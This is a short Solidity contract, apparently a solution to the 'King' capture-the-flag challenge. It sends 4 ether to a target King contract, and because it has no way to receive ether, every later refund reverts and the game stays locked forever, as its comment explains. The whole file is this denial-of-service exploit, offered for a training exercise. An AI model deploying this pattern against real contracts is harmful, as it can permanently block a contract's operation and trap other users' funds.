// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // No payable function, canot receive ether. Funds cannot be returned, and transcations reverted forever
        (bool response, ) = address(contractAddress).call{value: 4 ether}("");
    }
}
